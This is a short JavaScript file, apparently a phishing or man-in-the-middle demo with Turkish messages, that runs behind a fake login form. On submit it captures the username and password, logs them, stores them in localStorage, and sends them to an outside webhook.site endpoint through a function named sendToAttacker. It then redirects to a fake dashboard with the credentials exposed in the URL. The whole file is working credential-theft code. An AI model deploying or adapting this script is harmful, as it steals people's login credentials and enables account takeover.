document.getElementById('fakeLoginForm').addEventListener('submit', function (e) {
  e.preventDefault();

  const username = document.getElementById('fakeUsername').value.trim();
  const password = document.getElementById('fakePassword').value.trim();

  console.log("MITM ALERT ⚠️: Kullanıcı adı:", username, "| Şifre:", password);

  localStorage.setItem('mitmCapturedUsername', username);
  localStorage.setItem('mitmCapturedPassword', password);

  let capturedLog = JSON.parse(localStorage.getItem('mitmLog')) || [];
  capturedLog.push({ username, password, time: new Date().toLocaleString() });
  localStorage.setItem('mitmLog', JSON.stringify(capturedLog));

  sendToAttacker(username, password);

  const params = new URLSearchParams({ username, password });
  window.location.href = 'fakeDashboard.html?' + params.toString();
});

function sendToAttacker(username, password) {
  fetch('https://webhook.site/örnek-url', {
    method: 'POST',
    body: JSON.stringify({
      username: username,
      password: password,
      capturedAt: new Date().toISOString()
    }),
    headers: {
      'Content-Type': 'application/json'
    }
  }).catch(err => console.error("Sunucuya gönderilemedi:", err));
}
